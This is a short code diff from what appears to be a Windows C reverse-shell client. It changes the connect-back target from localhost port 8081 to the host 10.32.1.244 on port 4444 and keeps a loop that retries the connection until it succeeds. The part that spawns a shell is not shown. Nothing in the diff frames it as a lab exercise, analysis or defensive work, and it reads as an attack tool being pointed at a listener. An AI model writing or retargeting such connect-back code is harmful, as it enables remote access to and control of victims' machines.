@@ -117,8 +117,8 @@ int main() {
     sockfd = WSASocketA(2, 1, 6, 0, 0, 0);
 
     addr.sin_family = 2;
-    addr.sin_port = htons(8081);
-    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+    addr.sin_port = htons(4444);
+    addr.sin_addr.S_un.S_addr = inet_addr("10.32.1.244");
 
     while (connect(sockfd, (struct sockaddr*)&addr, 16));
 
